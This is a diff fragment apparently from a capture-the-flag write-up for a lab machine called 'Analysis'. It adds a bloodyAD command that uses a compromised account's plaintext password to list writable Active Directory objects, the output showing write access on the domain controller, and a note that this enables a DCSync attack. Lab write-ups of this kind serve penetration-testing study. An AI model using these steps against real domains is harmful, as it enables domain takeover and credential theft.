@@ -580,5 +580,18 @@ SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\soc_analyst
 
 This user is now compromised!
 
+# Domain Admin!
+
+```python
+❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u soc_analyst -p 'Password123!' get writable
+
+distinguishedName: CN=DC-ANALYSIS,OU=Domain Controllers,DC=analysis,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+```
+
+I have a lot of permissions on a lot of different objects, but the one highlighted above will allow me to perform a DCSync attack
+
 
 
